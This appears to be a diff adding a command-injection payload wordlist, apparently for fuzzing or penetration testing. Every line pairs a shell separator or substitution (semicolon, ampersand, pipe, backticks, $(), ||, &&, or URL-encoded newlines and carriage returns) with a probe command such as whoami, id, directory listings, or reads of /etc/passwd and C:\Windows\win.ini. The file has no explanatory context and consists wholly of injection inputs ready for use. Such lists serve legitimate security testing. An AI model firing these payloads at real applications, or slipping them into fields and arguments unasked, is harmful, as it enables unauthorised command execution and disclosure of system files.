@@ -1,1 +1,67 @@
-
+# Command Injection Payloads
+;whoami
+;id
+;ls -la
+;dir
+;cat /etc/passwd
+;type C:\Windows\win.ini
+&whoami
+&id
+&ls -la
+&dir
+&cat /etc/passwd
+&type C:\Windows\win.ini
+|whoami
+|id
+|ls -la
+|dir
+|cat /etc/passwd
+|type C:\Windows\win.ini
+`whoami`
+`id`
+`ls -la`
+`dir`
+`cat /etc/passwd`
+`type C:\Windows\win.ini`
+$(whoami)
+$(id)
+$(ls -la)
+$(dir)
+$(cat /etc/passwd)
+$(type C:\Windows\win.ini)
+||whoami
+||id
+||ls -la
+||dir
+||cat /etc/passwd
+||type C:\Windows\win.ini
+&&whoami
+&&id
+&&ls -la
+&&dir
+&&cat /etc/passwd
+&&type C:\Windows\win.ini
+%0a whoami
+%0a id
+%0a ls -la
+%0a dir
+%0a cat /etc/passwd
+%0a type C:\Windows\win.ini
+%0Awhoami
+%0Aid
+%0Als -la
+%0Adir
+%0Acat /etc/passwd
+%0Atype C:\Windows\win.ini
+%0dwhoami
+%0did
+%0dls -la
+%0ddir
+%0dcat /etc/passwd
+%0dtype C:\Windows\win.ini
+%0Dwhoami
+%0Did
+%0Dls -la
+%0Ddir
+%0Dcat /etc/passwd
+%0Dtype C:\Windows\win.ini
